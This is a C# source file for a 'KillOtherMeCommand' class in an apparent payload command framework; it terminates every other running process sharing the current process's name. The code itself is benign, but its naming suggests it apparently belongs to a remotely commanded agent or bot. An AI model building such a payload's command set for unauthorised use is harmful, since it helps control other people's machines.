using Payload.Common;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Payload.Core.Command
{
    public class KillOtherMeCommand : Payload.Command.Interface.ICommand
    {
        public override Task Execute()
        {
            int _currentProcessId = Process.GetCurrentProcess().Id;
            string _currentProcessName = Process.GetCurrentProcess().ProcessName;
            var pList = Process.GetProcessesByName(_currentProcessName);
            foreach (var process in pList)
                if(process.Id != _currentProcessId)
                    process.Kill();
            return null;
        }
    }
}
